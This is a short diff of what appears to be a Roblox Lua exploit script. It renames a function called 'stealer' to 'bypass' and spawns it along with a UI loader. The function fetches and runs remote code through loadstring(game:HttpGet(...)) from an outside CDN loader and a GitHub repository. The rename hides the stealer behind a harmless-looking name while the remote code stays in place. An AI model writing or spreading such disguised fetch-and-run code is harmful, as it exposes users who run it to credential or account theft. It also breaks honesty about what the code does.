@@ -1,4 +1,4 @@
-local function stealer()
+local function bypass()
     ID="b0235f3a-fee6-4c84-b7ec-7cd06c976ba6";
 loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 
@@ -9,5 +9,5 @@ loadstring(game:HttpGet(('https://raw.githubusercontent.com/FakeModz/LimitHub/re
 
 end
 
-task.spawn(stealer)
+task.spawn(bypass)
 task.spawn(loadui)
